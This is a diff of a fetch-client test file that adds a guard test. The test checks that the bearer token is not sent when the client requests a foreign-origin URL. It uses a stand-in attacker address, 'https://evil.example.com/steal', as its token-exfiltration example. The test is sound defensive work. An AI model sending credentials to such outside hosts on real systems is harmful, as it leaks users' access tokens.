@@ -171,6 +171,27 @@ describe('fetch-client', () => {
       expect(headers.get('Authorization')).toBe(`Bearer ${VALID_TOKEN}`);
     });
 
+    it('NEVER attaches the bearer token to a foreign-origin absolute URL', async () => {
+      // Token exfiltration guard: if any code path resolves an absolute URL to a
+      // host that is not the API origin, the access token must not ride along.
+      setAccessToken(VALID_TOKEN);
+      fetchMock.mockResolvedValueOnce(
+        new Response(JSON.stringify({}), {
+          status: 200,
+          headers: { 'Content-Type': 'application/json' },
+        }),
+      );
+
+      await apiClient.get('https://evil.example.com/steal');
+
+      const call = fetchMock.mock.calls[0];
+      const requestedUrl = call[0] as string;
+      const headers = (call[1] as RequestInit).headers as Headers;
+      // The absolute URL is used verbatim, but it carries NO Authorization.
+      expect(requestedUrl).toBe('https://evil.example.com/steal');
+      expect(headers.get('Authorization')).toBeNull();
+    });
+
     it('adds X-Request-ID', async () => {
       fetchMock.mockResolvedValueOnce(
         new Response(JSON.stringify({}), {
